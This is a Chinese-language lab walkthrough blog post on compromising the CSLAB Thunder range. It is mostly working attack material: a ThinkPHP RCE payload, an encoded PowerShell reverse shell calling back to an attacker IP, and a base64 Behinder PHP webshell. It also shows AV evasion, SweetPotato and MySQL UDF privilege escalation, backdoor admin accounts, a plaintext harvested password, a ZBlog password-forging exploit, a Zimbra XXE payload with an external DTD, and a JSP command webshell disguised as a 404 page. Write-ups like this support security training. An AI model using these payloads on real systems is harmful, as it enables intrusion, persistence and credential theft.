#  [靶场复现计划]CSLAB Thunder   
原创 DatouYoo  大头SEC   2025-02-02 08:13  
  
## 外网ThinkPHP RCE  
### 命令执行  
  
起手一个ThinkPHP  
```
/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28k2sFvuhX8tqermwJETE9D4cqPHxXdX29A5WpLWfgjW6QCwcYCpgFYOg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
坏，有360  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28koTiaNR6cUmD1ek4iaqkZX57RZ3thzuoFibrZPeIyFiavRFiaHzic4nZKsS0A/640?wx_fmt=png&from=appmsg "")  
  
image.png  
### 反弹shell  
  
先用powershell反弹个shell  
```
/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=powershell%20-nop%20-W%20hidden%20-noni%20-ep%20bypass%20-c%20%22%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient('172.16.233.2'%2C%2029998)%3B%24NetworkStream%20%3D%20%24TCPClient.GetStream()%3B%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter(%24NetworkStream)%3Bfunction%20WriteToStream%20(%24String)%20%7B%5Bbyte%5B%5D%5D%24script%3ABuffer%20%3D%200..%24TCPClient.ReceiveBufferSize%20%7C%20%25%20%7B0%7D%3B%24StreamWriter.Write(%24String%20%2B%20'SHELL%3E%20')%3B%24StreamWriter.Flush()%7DWriteToStream%20''%3Bwhile((%24BytesRead%20%3D%20%24NetworkStream.Read(%24Buffer%2C%200%2C%20%24Buffer.Length))%20-gt%200)%20%7B%24Command%20%3D%20(%5Btext.encoding%5D%3A%3AUTF8).GetString(%24Buffer%2C%200%2C%20%24BytesRead%20-%201)%3B%24Output%20%3D%20try%20%7BInvoke-Expression%20%24Command%202%3E%261%20%7C%20Out-String%7D%20catch%20%7B%24_%20%7C%20Out-String%7DWriteToStream%20(%24Output)%7D%24StreamWriter.Close()%22
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kBoiaARyhsWBiaNMPAl0EAnbicL5vRrXeXZRdX6hMhCvpL2WIdTU8DoBQg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
### 冰蝎shell  
  
反弹shell太难操作了，哥们还是上个冰蝎吧，嘻嘻。  
```
# 创建upload目录mkdir uploadcd upload# 写入.htaccess，解析4.php（默认不解析php文件）echo 'PElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+CiAgT3B0aW9ucyArRm9sbG93U3ltbGlua3MgLU11bHRpdmlld3MKICBSZXdyaXRlRW5naW5lIE9uCgogIFJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kCiAgUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYKICBSZXdyaXRlUnVsZSBeKC4qKSQgNC5waHAvJDEgW1FTQSxQVCxMXQo8L0lmTW9kdWxlPg=='>5.jpgcertutil.exe -decode 5.jpg .htaccess# 写入冰蝎webshellecho 'PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7CgkkX1NFU1NJT05bJ2snXT0ka2V5OwoJc2Vzc2lvbl93cml0ZV9jbG9zZSgpOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7Cj8+Cg=='>2.jpgcertutil.exe -decode 2.jpg 4.php
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kKPAdYeqk3gVHLG7znxHlVNzkB5LNpwtdvFSyafW2VYkTJOj2AOYlTQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
拿下新年第一个FLAG：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28k7icvHSdNtwJVL8AlKB1jZIUibbQ04okSEGibkNgC6rRFAntY95vj7FBkQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
### 上线CS并提权  
  
LOCAL SERVICE权限，直接SweetPotato提权  
  
用https://github.com/SecurityAnalysts01/ShellcodeLoader免杀  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kweQEqicrUa4IszqlhKBZapAwUMBnyrmb3RMLygk84SI8go1NVdliaBYQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kqjFYHKicdazuTKtRny7JZa4XC7nB6fwqf5xXj3m0ciaBiaU6j3fncibANg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
SweetPotato提权（新年第一提）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28k25hIccV4PUsRLEkgH5JribGAU0KADiajqTy8K9WBiamVEwh5yVt10h6icQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
顺手抓个密码，Administrator/Tp@cslKM  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28k8icystaNbQVkf2gnThdn54KLLziauiaH1icImxwt0IRCIPQlmpXqq2QvUg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
我直接远程加一手后门用户：  
```
shell net user benbi pass@123 /addshell net localgroup administrators benbi /add
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kQfjcImGBf3WiatvlUYhH4EsDq2G6ezITyaABgS06HVibdozscxnCBJWQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
不是哥们，还不让我连  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kxYFn0Gj3Y9DO3oFrficnVZYhIBRO2piaoCaLY1SedkYx0AHpsoKzicDgA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
CS开启一手RDP服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kaffiaLnAKhMxdOLSSiccq3DickA5L3fIvC4RJrVkT9RuwEJ9VIK3E9ogA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
RDP连接上第一件事：忘本（卸360，嘻嘻）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kjvnTBd4Mic4L0UD7NwicrlD3icdsibS0y78sibt233RpM7cUj8ecibBjQiaUg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kJMic0mP9PblH6RT7y8k4NprCbYoiaYPks08ia2LPwJE7jpPial8VETcMkw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 内网信息搜集  
  
根据题目提示，把cslab加到字典里，扫描出下面这个东东：  
- 172.20.57.98 3306 root cslab  
  
## MySQL UDF提权  
  
secure_file_priv为空，直接一手UDF提权  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kJl3ZRZD23FCtibsYr18VLPeIz6mIAoW9eZdcODzWs1omESKSaKslibwg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
坏，有Windows Defender，能落地但运行就寄  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kKacHHzKHXxOMX71jpgcWib5HsOHFCE6pDezVUVB1xI1ibPWbaPIjnYiaA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
嘻嘻，幸好可以分离免杀  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kkhGw6AME1bfIBCk1wGz2uo0Z6XcAvvysuR7GGaj4uiac44SWWyOhXyg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28k4Ycu7uzZojJKY5QrffvDJibzpdFVQk8ibNqL88FW4QOViclSK6ibY46cSQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
流量转发转发再转发~转发到自己的CS~  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kZOLsqWibaeCetAsybSIDl7jibjrg74eudeFmYGskO7vsaJ9NL99eveBw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
SweetPotato继续提（新年第二提）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28km5YPL2uiaiaU6I6hHH5cqxFE8Kmib42EJ74iapTyV33iccxbhoIb0lfyRdQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
嘿嘿，我又加后门用户啦  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28k8COSkmfEcN8GvKIu9IAeIhrAQvEqnXQ0Gnqbx2esQuVZia2xHTDdGUQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
蛇年第二个FLAG  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28ktfTKdvib6tvXdmJYOVDJ4VaZgNVcK2st1gbLbaG3SVZgyo9fcpVDutQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
又是双网卡嘞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kTbwmz2gLbCgITp2PkEAxBhkxYKof8KDoTwH9MXT4dAVUFbeJakgv6A/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## ZBlog篡改密码RCE  
  
哟，有个ZBlog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kfWeG6uWZvkg6kO1T2icib43UA2nYTrLfibLjk2lqLgK86WwOG6k07pdow/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
ZBlog1.7.3  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kTpvEr4npHcduUWw3nWcD3icBHzJxQUwZrhFMeFBMHZCaYiaXnSR3tVYg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
拉一手源码，审  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kdFo89BR4kwDkZeYwDias6LribeZtDFLjNUECKZicUW9I4Tib8CXRqZqcbg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
嘿，guid我有，ps可控，这不轻松拿捏  
```
ps = 123456guid = 24d876c8772572cf839674c5a176e41cPassword = md5(md5(123456) + 24d876c8772572cf839674c5a176e41c)Password = 30492f76a0fbcf3906cce8b4b566d6b6
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kxbx32GS5z6SP8eFuVbgiclLKIMvd9lhAicIrsEXqibUYASzbZoSr0yIEg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
进后台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kic5RIDCYibXqUia8ibjsh4yvBiaqdpmhY5cBzWV2VmT23gvU5oibDRTXlibjw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
传个害群之马：  
- https://github.com/fengyijiu520/Z-Blog-  
  
sudo小提一手权，这个/home/www/write.sh很微妙，直接root  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kGtvXjoedaiaZF8QriaKBjSzVIOu5B2XBsn3uSE8PGWoquhticos3ticJjA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28khnUl0JTeKRUhkgic59bpXMkXzdCIPiboe8fgmfMPxZenfICFXE6HwQiaA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
不是哥们，怎么还有一层  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kfzeo3kiaDjHos8LOdLNn2TxPGYsXDDQtTNStBKa3d94uTwicIYJy4vbA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## Zimbra XXE SSRF  
  
dtd如下：  
```
<!ENTITY % file SYSTEM "file:../conf/localconfig.xml"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kIprpQzabib2TYK1c917sBkyt751eVeXEQ0hLakgHbguhyOReQ6peAbQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
直接读密码，嘿嘿  
```
POST /Autodiscover/Autodiscover.xml HTTP/1.1Host: 10.1.1.56:8443Cookie: ZM_TEST=trueCache-Control: max-age=0Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "macOS"Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Priority: u=0, iConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 398<!DOCTYPE Autodiscover [        <!ENTITY % dtd SYSTEM "http://10.1.1.78/1.dtd">        %dtd;        %all;        ]><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">    <Request>        <EMailAddress>aaaaa</EMailAddress>        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>    </Request></Autodiscover>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28koPic3L1wpBbnATDyLC16AqZI80wBtl4jBRbn7e5YWZzB7fmQKYAia1SQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
账密在手，天下我有  
```
python3 Zimbra_SOAP_API_Manage.py https://10.1.1.56:8443 zimbra rhqkAlU5n_ ssrfuploadwebshellshell.jsp
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28kwFibb67ZTia7IcVkISibC7I4hXxlBEOKGlddlWfQzVbVtFUdzw0WZrh0g/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
shell.jsp：  
```
<!-- gh/aels --> <H1><CENTER>404 Not Found</CENTER></H1><%@ page import="java.io.*" %><%    String cmd = request.getParameter("cmd");    String output = "";    String error = "";    if(cmd != null) {        String[] commandAndArgs = new String[]{ "/bin/bash", "-c", cmd };        String s = null;        Process process = Runtime.getRuntime().exec(commandAndArgs);        InputStream inputStream = process.getInputStream();        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));        Thread.sleep(2000);        while(process.isAlive()) Thread.sleep(100);        while((s = reader.readLine()) != null) { output += s+"\n"; }        reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));        while((s = reader.readLine()) != null) { error += s+"\n"; }    }%><FORM><INPUT name=cmd style=border:0;display:block; type=text value='<%=cmd %>'></FORM><pre>    <%=output %>    <%=error %></pre>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9yCMickialrDE4usbPhibK28ktNE47Y5c2hyT4vpOVLpDrpICH7Ynv5rrlPyMbicmYsHUYFstMiaenNTg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
下班下班，出门放炮了。  
  
  
